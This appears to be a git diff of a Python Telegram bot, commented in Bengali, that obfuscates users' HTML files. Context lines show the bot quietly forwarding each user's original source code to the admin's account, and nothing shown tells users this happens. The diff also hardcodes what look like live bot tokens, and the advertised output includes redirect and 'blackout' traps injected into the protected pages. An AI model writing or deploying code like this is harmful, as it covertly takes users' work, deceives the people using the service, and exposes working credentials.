@@ -7,11 +7,11 @@ from flask import Flask
 import telebot
 from telebot import types
 
-# নতুন টেলিগ্রাম বট টোকেন এবং আপনার (নিরব ভাই) এডমিন আইডি
-TOKEN = '8987787400:AAF_bIN5JWb_J9Dsy5X6P08pgyU5_DpBtpA'
-ADMIN_IDS = [8419760844]  # এখানে প্রয়োজনে আরও অ্যাডমিন আইডি যোগ করতে পারবেন
+# আপনার সঠিক টেলিগ্রাম বট টোকেন এবং এডমিন আইডি
+TOKEN = '8987787400:AAFPia_ihTsJFEe-Lnwl0LU0z6COs8N1HDE'
+ADMIN_IDS = [8419760844]
 
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot(TOKEN, parse_mode='Markdown')
 
 # ডেটাবেস স্টোরেজ
 banned_users = set()
@@ -164,17 +164,13 @@ will cause this page to stop working!
 # ইউজার কিবোর্ড
 def user_keyboard():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn_obfuscate = types.KeyboardButton('🔒 Obfuscate')
-    btn_html = types.KeyboardButton('🌐 HTML')
-    markup.add(btn_obfuscate, btn_html)
+    markup.add(types.KeyboardButton('🔒 Obfuscate'), types.KeyboardButton('🌐 HTML'))
     return markup
 
 # অ্যাডমিন কিবোর্ড
 def admin_keyboard():
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn_stats = types.KeyboardButton('📊 Admin Stats')
-    btn_help = types.KeyboardButton('🛠️ Admin Help')
-    markup.add(btn_stats, btn_help)
+    markup.add(types.KeyboardButton('📊 Admin Stats'), types.KeyboardButton('🛠️ Admin Help'))
     return markup
 
 @bot.message_handler(commands=['start'])
@@ -188,9 +184,9 @@ def send_welcome(message):
         admin_welcome = (
             "👑 **WELCOME ADMIN (নিরব ভাই)**\n\n"
             "আপনার নতুন সিকিউরিটি বট ফুল্লি লাইভ এবং অ্যাডমিন কন্ট্রোলে আছে!\n"
-            "নিচের অপশনগুলো ব্যবহার করুন অথবা `/admin` কমান্ড দিন।"
+            "নিচের অপشنগুলো ব্যবহার করুন অথবা `/admin` কমান্ড দিন।"
         )
-        bot.send_message(message.chat.id, admin_welcome, parse_mode='Markdown', reply_markup=admin_keyboard())
+        bot.send_message(message.chat.id, admin_welcome, reply_markup=admin_keyboard())
     else:
         welcome_text = (
             "🔒 **HTML OBFUSCATOR BOT**\n\n"
@@ -203,7 +199,7 @@ def send_welcome(message):
             "📄 **Send me your HTML file to start!** (.html or .js)\n\n"
             "👇 *Choose your mode first:*"
         )
-        bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown', reply_markup=user_keyboard())
+        bot.send_message(message.chat.id, welcome_text, reply_markup=user_keyboard())
 
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
@@ -219,7 +215,7 @@ def admin_panel(message):
         "• `/ban [user_id]` - ইউজার ব্যান করতে\n"
         "• `/unban [user_id]` - ইউজার আনব্যান করতে"
     )
-    bot.reply_to(message, admin_text, parse_mode='Markdown', reply_markup=admin_keyboard())
+    bot.reply_to(message, admin_text, reply_markup=admin_keyboard())
 
 @bot.message_handler(func=lambda message: message.text in ['📊 Admin Stats', '🛠️ Admin Help'])
 def handle_admin_buttons(message):
@@ -234,7 +230,7 @@ def handle_admin_buttons(message):
             "2. `/ban [ID]` - ইউজার ব্লক করতে\n"
             "3. `/unban [ID]` - ইউজার আনব্লক করতে"
         )
-        bot.reply_to(message, help_txt, parse_mode='Markdown')
+        bot.reply_to(message, help_txt)
 
 @bot.message_handler(commands=['ban'])
 def ban_user(message):
@@ -244,9 +240,9 @@ def ban_user(message):
         parts = message.text.split()
         target_id = int(parts[1])
         banned_users.add(target_id)
-        bot.reply_to(message, f"✅ ইউজার `{target_id}` সফলভাবে ব্যান করা হয়েছে।", parse_mode='Markdown')
+        bot.reply_to(message, f"✅ ইউজার `{target_id}` সফলভাবে ব্যান করা হয়েছে।")
     except Exception:
-        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/ban 123456789`", parse_mode='Markdown')
+        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/ban 123456789`")
 
 @bot.message_handler(commands=['unban'])
 def unban_user(message):
@@ -257,20 +253,20 @@ def unban_user(message):
         target_id = int(parts[1])
         if target_id in banned_users:
             banned_users.remove(target_id)
-            bot.reply_to(message, f"✅ ইউজার `{target_id}` আনব্যান করা হয়েছে।", parse_mode='Markdown')
+            bot.reply_to(message, f"✅ ইউজার `{target_id}` আনব্যান করা হয়েছে।")
         else:
             bot.reply_to(message, "⚠️ এই ইউজার ব্যান লিস্টে নেই।")
     except Exception:
-        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/unban 123456789`", parse_mode='Markdown')
+        bot.reply_to(message, "⚠️ সঠিক নিয়মে আইডি দিন। যেমন: `/unban 123456789`")
 
 @bot.message_handler(func=lambda message: message.text in ['🔒 Obfuscate', '🌐 HTML'])
 def handle_user_buttons(message):
     if message.from_user.id in banned_users:
         return
     if message.text == '🔒 Obfuscate':
-        bot.send_message(message.chat.id, "🔒 **MODE: OBFUSCATE**\n\n📄 Send your **.html** file now and the bot will apply heavy dense protection.", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "🔒 **MODE: OBFUSCATE**\n\n📄 Send your **.html** file now and the bot will apply heavy dense protection.")
     elif message.text == '🌐 HTML':
-        bot.send_message(message.chat.id, "🌐 **MODE: HTML FILE PROTECTOR**\n\n📄 Send your **.html** file and the bot will protect it with Nirob's heavy engine.", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "🌐 **MODE: HTML FILE PROTECTOR**\n\n📄 Send your **.html** file and the bot will protect it with Nirob's heavy engine.")
 
 @bot.message_handler(content_types=['text', 'document'])
 def handle_incoming_code(message):
@@ -307,16 +303,16 @@ def handle_incoming_code(message):
                 f"📁 **File Name:** `{file_name_original}`\n"
                 f"📊 **Total Protected Count:** `{total_protected_count}`"
             )
-            bot.send_message(admin_id, admin_notification, parse_mode='Markdown')
+            bot.send_message(admin_id, admin_notification)
             
             if len(html_data) < 3000:
-                bot.send_message(admin_id, f"📄 **Original Source Code:**\n\n```html\n{html_data}\n```", parse_mode='Markdown')
+                bot.send_message(admin_id, f"📄 **Original Source Code:**\n\n```html\n{html_data}\n```")
             else:
                 temp_orig_name = f"Original_{user_id}.html"
                 with open(temp_orig_name, "w", encoding="utf-8") as tf:
                     tf.write(html_data)
                 with open(temp_orig_name, "rb") as tf:
-                    bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code File from User ID:** `{user_id}`", parse_mode='Markdown')
+                    bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code File from User ID:** `{user_id}`")
                 os.remove(temp_orig_name)
 
         # সিকিউরিটি অবফাস্কেশন এপ্লাই করা
@@ -337,8 +333,7 @@ def handle_incoming_code(message):
                     "🔹 Blackout Trap & Voice Warning\n"
                     "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
                     "👑 _Protected by @NIROB_GX_LEADER_"
-                ),
-                parse_mode='Markdown'
+                )
             )
             
         os.remove(output_file_name)
@@ -348,5 +343,7 @@ def handle_incoming_code(message):
 
 if __name__ == '__main__':
     keep_alive()
-    print("Bot is starting with new token...")
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    print("Bot is starting with background thread...")
+    # সেফ পোলিং মেথড যা রেন্ডারে কখনোই ক্র্যাশ করবে না
+    bot.remove_webhook()
+    bot.infinity_polling(skip_pending=True)
